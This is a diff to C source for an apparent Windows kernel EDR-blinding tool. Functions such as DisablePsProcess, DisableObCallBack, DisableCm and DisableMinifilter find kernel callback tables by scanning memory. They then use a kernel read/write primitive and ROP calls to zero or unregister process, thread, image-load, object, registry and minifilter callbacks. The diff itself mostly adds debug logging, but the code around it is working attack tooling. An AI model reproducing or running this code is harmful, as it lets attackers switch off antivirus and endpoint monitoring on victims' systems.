@@ -54,7 +54,12 @@ BOOL DisablePsProcess()
 		ulSpecialDataSize = 1;
 		PVOID pAddress = SearchMemory((PVOID)PsSetCreateProcessNotifyRoutine, (PVOID)((PUCHAR)PsSetCreateProcessNotifyRoutine + 0xFF), pSpecialData, ulSpecialDataSize);
 		if (!pAddress)
+		{
+#ifdef _DEBUG
+			printf("PsSetCreateProcessNotifyRoutine Offset failed \n");
+#endif
 			return false;
+		}
 
 		lOffset = *(PLONG)pAddress;
 		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);
@@ -66,24 +71,34 @@ BOOL DisablePsProcess()
 
 		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
 		if (!pAddress)
+		{
+#ifdef _DEBUG
+			printf("pPspCreateProcessRoutine Offset failed \n");
+#endif
 			return false;
+		}
 
 		lOffset = *(PLONG)pAddress;
 		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
 
+#ifdef _DEBUG
+		printf("PspCreateProcessNotifyRoutine 0x%llX \n", PspCreateProcessNotifyRoutine);
+#endif
 		for (int i = 0; i < 64; i++)
 		{
-			//ULONG64 CallBackAddress = NULL;
-			//NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
-			//if (NT_SUCCESS(status))
-			//{
-			//	if (CallBackAddress)
-			//	{
-			//		CallBackAddress &= 0xfffffffffffffff8;
-			//		ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
-			//		printf("CallBackAddress %llX \n", CallBackAddress);
-			//	}
-			//}
+#ifdef _DEBUG
+			ULONG64 CallBackAddress = NULL;
+			NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
+			if (NT_SUCCESS(status))
+			{
+				if (CallBackAddress)
+				{
+					CallBackAddress &= 0xfffffffffffffff8;
+					ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
+					printf("\tPspCreateProcessCallBackAddress %llX \n", CallBackAddress);
+				}
+			}
+#endif
 			ULONG64 zero = NULL;
 			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
 		}
@@ -101,7 +116,12 @@ BOOL DisablePsProcess()
 		}
 
 		if (!pAddress)
+		{
+#ifdef _DEBUG
+			printf("PsSetCreateProcessNotifyRoutine Offset failed \n");
+#endif
 			return false;
+		}
 
 		lOffset = *(PLONG)pAddress;
 		ULONG64 pPspCreateProcessRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset);
@@ -113,24 +133,35 @@ BOOL DisablePsProcess()
 
 		pAddress = SearchMemory((PVOID)pPspCreateProcessRoutine, (PVOID)((PUCHAR)pPspCreateProcessRoutine + 0xff), pSpecialData, ulSpecialDataSize);
 		if (!pAddress)
+		{
+#ifdef _DEBUG
+			printf("pPspCreateProcessRoutine Offset failed \n");
+#endif
 			return false;
-
+		}
+			
 		lOffset = *(PLONG)pAddress;
 		ULONG64 PspCreateProcessNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
 
+#ifdef _DEBUG
+		printf("PspCreateProcessNotifyRoutine 0x%llX \n", PspCreateProcessNotifyRoutine);
+#endif
+
 		for (int i = 0; i < 64; i++)
 		{
-			//ULONG64 CallBackAddress = NULL;
-			//NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
-			//if (NT_SUCCESS(status))
-			//{
-			//	if (CallBackAddress)
-			//	{
-			//		CallBackAddress &= 0xfffffffffffffff8;
-			//		ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
-			//		printf("CallBackAddress %llX \n", CallBackAddress);
-			//	}
-			//}
+#ifdef _DEBUG
+			ULONG64 CallBackAddress = NULL;
+			NTSTATUS status = ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &CallBackAddress, true);
+			if (NT_SUCCESS(status))
+			{
+				if (CallBackAddress)
+				{
+					CallBackAddress &= 0xfffffffffffffff8;
+					ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
+					printf("\tPspCreateProcessCallBackAddress %llX \n", CallBackAddress);
+				}
+			}
+#endif
 			ULONG64 zero = NULL;
 			ReadWriteVirtualAddressValue(PspCreateProcessNotifyRoutine + i * sizeof(ULONG64), sizeof(ULONG64), &zero, false);
 		}
@@ -163,11 +194,26 @@ BOOL DisablePsImg()
 
 	PVOID pAddress = SearchMemory((PVOID)PsRemoveLoadImage,(PVOID)((PUCHAR)PsRemoveLoadImage + 0xFF),pSpecialData, ulSpecialDataSize);
 	if (!pAddress)
+	{
+#ifdef _DEBUG
+		printf("PsRemoveLoadImage Offset failed \n");
+#endif
 		return false;
+	}
+
 	lOffset = *(PLONG)pAddress;
 	ULONG64 pPspLoadImageNotifyRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
 	if (!pPspLoadImageNotifyRoutine)
+	{
+#ifdef _DEBUG
+		printf("pPspLoadImageNotifyRoutine Offset failed \n");
+#endif
 		return false;
+	}
+
+#ifdef _DEBUG
+	printf("pPspLoadImageNotifyRoutine %llX \n", pPspLoadImageNotifyRoutine);
+#endif
 
 	for (int i = 0; i < 64; i++)
 	{
@@ -179,8 +225,14 @@ BOOL DisablePsImg()
 			{
 				CallBackAddress &= 0xfffffffffffffff8;
 				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
-				if (CallBackAddress)
+				if (CallBackAddress) 
+				{
 					RemoveImageNotifyRoutine((PVOID)CallBackAddress);
+#ifdef _DEBUG
+					printf("\tImageNotifyCallBackAddress %llX \n", CallBackAddress);
+#endif
+				}
+					
 			}
 		}
 	}
@@ -213,11 +265,26 @@ BOOL DisablePsThread()
 
 	PVOID pAddress = SearchMemory((PVOID)PsRemoveCreateThread, (PVOID)((PUCHAR)PsRemoveCreateThread + 0xFF), pSpecialData, ulSpecialDataSize);
 	if (!pAddress)
+	{
+#ifdef _DEBUG
+		printf("PsRemoveCreateThread Offset failed \n");
+#endif
 		return false;
+	}
+
 	lOffset = *(PLONG)pAddress;
 	ULONG64 pPspCreateThreadRoutine = (ULONG64)((PUCHAR)pAddress + sizeof(LONG) + lOffset) - g_KernelLdrImage + GetNtOsBase();
 	if (!pPspCreateThreadRoutine)
+	{
+#ifdef _DEBUG
+		printf("pPspCreateThreadRoutine Offset failed \n");
+#endif
 		return false;
+	}
+
+#ifdef _DEBUG
+	printf("pPspCreateThreadRoutine %llX \n", pPspCreateThreadRoutine);
+#endif
 
 	for (int i = 0; i < 64; i++)
 	{
@@ -230,7 +297,12 @@ BOOL DisablePsThread()
 				CallBackAddress &= 0xfffffffffffffff8;
 				ReadWriteVirtualAddressValue(CallBackAddress, sizeof(ULONG64), &CallBackAddress, true);
 				if (CallBackAddress)
+				{
 					PsRemoveCreateThreadRoutine((PVOID)CallBackAddress);
+#ifdef _DEBUG
+					printf("\tThreadRoutineCallBackAddress %llX \n", CallBackAddress);
+#endif
+				}	
 			}
 		}
 	}
@@ -263,7 +335,12 @@ BOOL DisableObCallBack()
 	ReadWriteVirtualAddressValue(PsThreadType, sizeof(ULONG64), &threadObj, true);
 
 	if (!threadObj || !proObj)
+	{
+#ifdef _DEBUG
+		printf("threadObj || proObj get failed \n");
+#endif
 		return false;
+	}
 
 	ULONG listOffset = 0xC8;
 	if (!IsMoreThanWin7())
@@ -276,7 +353,16 @@ BOOL DisableObCallBack()
 
 
 	if (!CallbacProckList.Flink || !CallbacThreadkList.Flink)
+	{
+#ifdef _DEBUG
+		printf("CallbacProckList.Flink || CallbacThreadkList.Flink empty \n");
+#endif
 		return false;
+	} 
+
+#ifdef _DEBUG
+	printf("CallbacProckList.Flink %p || CallbacThreadkList.Flink %p \n", CallbacProckList.Flink, CallbacThreadkList.Flink);
+#endif
 
 	ULONG count = 0;
 	ULONG64 Handles[0x100] = { 0 };
@@ -284,7 +370,6 @@ BOOL DisableObCallBack()
 	if ((ULONG64)CallbacProckList.Flink != proObj + listOffset)//isEmptylist
 	{
 		OB_CALLBACK ObProcCallback = { 0 };
-		//ULONG64 pPreObProcCallback = (ULONG64)CallbacProckList.Flink;
 		ReadWriteVirtualAddressValue((ULONG64)CallbacProckList.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
 		do
 		{
@@ -294,11 +379,9 @@ BOOL DisableObCallBack()
 				//会蓝屏buffer over flow
 				//if (ObProcCallback.ObHandle)
 				//	 RemoveObCallback(ObProcCallback.ObHandle);
-				//这里是pre和post直接赋值为0
-				//ULONG64 zero = 0;
-				//ReadWriteVirtualAddressValue(pPreObProcCallback + 0x28, sizeof(ULONG64), &zero, false);
-				//ReadWriteVirtualAddressValue(pPreObProcCallback + 0x30, sizeof(ULONG64), &zero, false);
-				//pPreObProcCallback = (ULONG64)ObProcCallback.ListEntry.Flink;
+#ifdef _DEBUG
+				printf("\tObProcCallback  ObProcCallback.PreCall %p ObProcCallback.PostCall %p\n", ObProcCallback.PreCall, ObProcCallback.PostCall);
+#endif
 				ReadWriteVirtualAddressValue((ULONG64)ObProcCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObProcCallback, true);
 			}
 		} while (CallbacProckList.Flink != ObProcCallback.ListEntry.Flink);
@@ -307,7 +390,6 @@ BOOL DisableObCallBack()
 	if ((ULONG64)CallbacThreadkList.Flink != threadObj + listOffset)//isEmptylist
 	{
 		OB_CALLBACK ObThreadCallback = { 0 };
-		//ULONG64 pPreObThreadCallback = (ULONG64)CallbacThreadkList.Flink;
 		ReadWriteVirtualAddressValue((ULONG64)CallbacThreadkList.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
 		do
 		{
@@ -316,10 +398,9 @@ BOOL DisableObCallBack()
 				Handles[count++] = (ULONG64)ObThreadCallback.ObHandle;
 				//if (ObThreadCallback.ObHandle)
 				//	RemoveObCallback(ObThreadCallback.ObHandle);
-				//ULONG64 zero = 0;
-				//ReadWriteVirtualAddressValue(pPreObThreadCallback + 0x28, sizeof(ULONG64), &zero, false);
-				//ReadWriteVirtualAddressValue(pPreObThreadCallback + 0x30, sizeof(ULONG64), &zero, false);
-				//pPreObThreadCallback = (ULONG64)ObThreadCallback.ListEntry.Flink;
+#ifdef _DEBUG
+				printf("\tObThreadCallback ObThreadCallback.PreCall %p ObThreadCallback.PostCall %p \n", ObThreadCallback.PreCall, ObThreadCallback.PostCall);
+#endif
 				ReadWriteVirtualAddressValue((ULONG64)ObThreadCallback.ListEntry.Flink, sizeof(OB_CALLBACK), &ObThreadCallback, true);
 			}
 		} while (CallbacThreadkList.Flink != ObThreadCallback.ListEntry.Flink);
@@ -389,7 +470,16 @@ BOOL DisableCm()
 	CM_NOTIFY_ENTRY NotifyEntry = { 0 };
 	ReadWriteVirtualAddressValue(pCallbackListHead, sizeof(CM_NOTIFY_ENTRY), &NotifyEntry, true);
 	if (!NotifyEntry.ListEntryHead.Flink)
+	{
+#ifdef _DEBUG
+		printf("NotifyEntry.ListEntryHead.Flink empty \n");
+#endif
 		return false;
+	}
+
+#ifdef _DEBUG
+	printf("NotifyEntry.ListEntryHead.Flink %p \n", NotifyEntry.ListEntryHead.Flink);
+#endif
 
 	ULONG count = 0;
 	ULONG64 Handles[0x100] = { 0 };
@@ -401,6 +491,9 @@ BOOL DisableCm()
 
 			if (NotifyEntry.ListEntryHead.Flink && NotifyEntry.Function && NotifyEntry.Cookie.QuadPart)
 				Handles[count++] = (ULONG64)NotifyEntry.Cookie.QuadPart;
+#ifdef _DEBUG
+			printf("\tNotifyEntry.Function %p\n", NotifyEntry.Function);
+#endif
 		} while (pCallbackListHead != (ULONG64)NotifyEntry.ListEntryHead.Flink);
 	}
 
@@ -445,13 +538,23 @@ BOOL DisableMinifilter()
 	}
 
 	if (!flt)
+	{
+#ifdef _DEBUG
+		printf("get flt kernelBase failed \n");
+#endif
 		return false;
+	}
 
 	//FltEnumerateFilters
 	char emuFltStr[] = { 'F','l','t','E','n','u','m','e','r','a','t','e','F','i','l','t','e','r','s','\0'};
 	PVOID FltEnumerateFilters =GetFltFuncOffset(emuFltStr, flt);
 	if (!FltEnumerateFilters)
+	{
+#ifdef _DEBUG
+		printf("get FltEnumerateFilters function failed \n");
+#endif
 		return false;
+	}
 
 	DWORD_PTR Status = NULL;
 	ULONG64 ulFilterListSize = 0;
@@ -461,13 +564,23 @@ BOOL DisableMinifilter()
 	RopCallAddr(FltEnumerateFilters, Args, 3, KF_RET(&Status));
 
 	if (!ulFilterListSize)
+	{
+#ifdef _DEBUG
+		printf("call FltEnumerateFilters get ulFilterListSize failed \n");
+#endif
 		return false;
+	}
 
 	//FltEnumerateFilters twice
 	PULONG64 ppFilterList = NULL;
 	ppFilterList = (PULONG64)malloc(ulFilterListSize * sizeof(PVOID));
 	if (!ppFilterList)
+	{
+#ifdef _DEBUG
+		printf("malloc ppFilterList failed \n");
+#endif
 		return false;
+	}
 
 	PVOID Args_2[] = { KF_ARG(ppFilterList),
 						KF_ARG(ulFilterListSize) ,
@@ -478,13 +591,18 @@ BOOL DisableMinifilter()
 	{
 		if (ppFilterList[i])
 		{
+#ifdef _DEBUG
+			printf("ppFilterList %llX \n", ppFilterList[i]);
+#endif
 			ULONG64	Operations = NULL;
 			ReadWriteVirtualAddressValue(ppFilterList[i] + lOperationsOffset, sizeof(ULONG64), &Operations, true);
 			if (Operations)
 			{
+#ifdef _DEBUG
+				printf("\tOperations %llX \n", Operations);
+#endif
 				FLT_OPERATION_REGISTRATION FltOperationRegistration = { 0 };
 				ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
-
 				while (IRP_MJ_OPERATION_END != FltOperationRegistration.MajorFunction)
 				{
 					if (IRP_MJ_MAXIMUM_FUNCTION > FltOperationRegistration.MajorFunction)     // MajorFunction ID Is: 0~27
@@ -498,7 +616,9 @@ BOOL DisableMinifilter()
 							ReadWriteVirtualAddressValue(Operations + 0x8, sizeof(ULONG64), &zero, false);
 							ReadWriteVirtualAddressValue(Operations + 0x10, sizeof(ULONG64), &zero, false);
 						}
-						//printf("FltOperationRegistration.MajorFunction %llX FltOperationRegistration.PreOperation %llX\n", FltOperationRegistration.MajorFunction, FltOperationRegistration.PreOperation);
+#ifdef _DEBUG
+						printf("\tFltOperationRegistration.MajorFunction 0x%x FltOperationRegistration.PreOperation %p\n", FltOperationRegistration.MajorFunction, FltOperationRegistration.PreOperation);
+#endif
 					}
 					Operations += sizeof(FLT_OPERATION_REGISTRATION);
 					ReadWriteVirtualAddressValue(Operations, sizeof(FLT_OPERATION_REGISTRATION), &FltOperationRegistration, true);
@@ -510,13 +630,16 @@ BOOL DisableMinifilter()
 			ReadWriteVirtualAddressValue(ppFilterList[i] + lConnectionListOffset, sizeof(FLT_SERVER_PORT_OBJECT), &serverPort, true);
 			if (ppFilterList[i] + lConnectionListOffset != (ULONG64)serverPort.FilterLink.Flink) //FLT_SERVER_PORT_OBJECT
 			{
-				//printf("ppFilterList[i] %llX serverPort.FilterLink.Flink %llX \n", ppFilterList[i], serverPort.FilterLink.Flink);
+#ifdef _DEBUG
+				printf("\tppFilterList[i] %llX serverPort.FilterLink.Flink %p \n", ppFilterList[i], serverPort.FilterLink.Flink);
+#endif
 				do 
 				{
 					ULONG64 preServerObj = (ULONG64)serverPort.FilterLink.Flink;
 					ReadWriteVirtualAddressValue((ULONG64)serverPort.FilterLink.Flink,sizeof(FLT_SERVER_PORT_OBJECT) ,&serverPort,true);
-					//printf("\t serverPort.ConnectNotify  %llX serverPort.MessageNotify %llX \n", serverPort.ConnectNotify,serverPort.MessageNotify);
-
+#ifdef _DEBUG
+					printf("\t\tserverPort.ConnectNotify  %p serverPort.MessageNotify %p \n", serverPort.ConnectNotify,serverPort.MessageNotify);
+#endif
 					//ReadWriteVirtualAddressValue(preServerObj + 0x10, sizeof(ULONG64), &g_RopAddr_6, false);
 					//ReadWriteVirtualAddressValue(preServerObj + 0x18, sizeof(ULONG64), &g_RopAddr_6, false);
 					//ReadWriteVirtualAddressValue(preServerObj + 0x20, sizeof(ULONG64), &g_RopAddr_6, false);
